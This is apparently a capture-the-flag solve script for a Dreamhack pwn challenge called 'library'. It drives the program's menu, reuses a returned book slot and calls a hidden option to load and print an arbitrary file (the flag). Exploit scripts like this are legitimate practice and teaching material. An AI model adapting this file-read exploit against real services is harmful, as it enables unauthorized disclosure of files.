#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./library")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 9489)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def borrow_book(idx: int):
        io.sendlineafter("menu : ", "1")
        io.sendlineafter("borrow? : ", str(idx))
        return

    def read_book(idx: int):
        io.sendlineafter("menu : ", "2")
        io.sendlineafter("read? : ", str(idx))
        return

    def return_book():
        io.sendlineafter("menu : ", "3")
        return

    def steal_book(path: str, pages: int):
        io.sendlineafter("menu : ", str(0x113))
        io.sendlineafter("book? : ", path)
        io.sendlineafter("400) : ", str(pages))
        return

    # flag_path = "./flag"
    flag_path = "/home/pwnlibrary/flag.txt"

    borrow_book(1)
    return_book()
    steal_book(flag_path, 0x100)
    read_book(0)

    io.recvuntil("DH{")
    flag = "DH{" + io.recvuntil("}").decode()
    ptr.logger.info(f"flag: {flag}")
    return


if __name__ == "__main__":
    main()
